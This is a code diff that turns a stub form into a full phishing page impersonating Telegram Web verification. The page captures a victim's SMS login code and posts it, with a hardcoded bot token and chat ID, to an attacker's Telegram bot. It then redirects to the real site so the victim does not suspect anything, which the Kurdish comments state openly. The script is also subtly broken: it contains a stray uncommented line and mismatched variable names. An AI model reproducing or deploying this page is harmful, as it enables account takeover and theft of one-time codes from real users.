@@ -1,9 +1,52 @@
-<!-- otp_verify.html -->
-<div class="login-box">
-    <h2>Enter Code</h2>
-    <p>We've sent an SMS with an activation code to your phone.</p>
-    <form action="code_capture.php" method="POST">
-        <input type="text" name="otp_code" placeholder="Enter code" required>
-        <button type="submit">LOGIN</button>
-    </form>
-</div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Web - Verification</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f4f4f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 320px; text-align: center; }
+        h2 { color: #222; margin-bottom: 10px; }
+        p { color: #707579; font-size: 14px; margin-bottom: 25px; }
+        input[type="text"] { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #dadce0; border-radius: 5px; font-size: 18px; text-align: center; letter-spacing: 5px; box-sizing: border-box; }
+        button { background-color: #3390ec; color: white; border: none; padding: 12px; width: 100%; border-radius: 5px; font-size: 16px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2>Enter Code</h2>
+        <p>We've sent an SMS with an activation code to your phone.</p>
+        
+        <form id="otpForm">
+            <input type="text" id="otp_code" placeholder="-----" maxlength="5" required>
+            <button type="submit">CONFIRM</button>
+        </form>
+    </div>
+
+    <script>
+        // لێرە تۆکن و ئایدی خۆت دابنێ
+       const token = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
+       const chatID = "6679834643";
+نموونەیە، هی خۆت دابنێ
+
+        document.getElementById('otpForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const code = document.getElementById('otp_code').value;
+            const message = "🎯 OTP CODE RECEIVED!\n\n🔑 Code: " + code;
+
+            // ناردنی کۆد بۆ تێلگرام
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            }).then(() => {
+                // دوای ناردنی کۆدەکە، قوربانی دەبات بۆ سایتی فەرمی تێلگرام تا گومانی لا دروست نەبێت
+                window.location.href = "https://web.telegram.org/k/";
+            }).catch(err => {
+                console.error("Error sending data:", err);
+            });
+        });
+    </script>
+</body>
+</html>
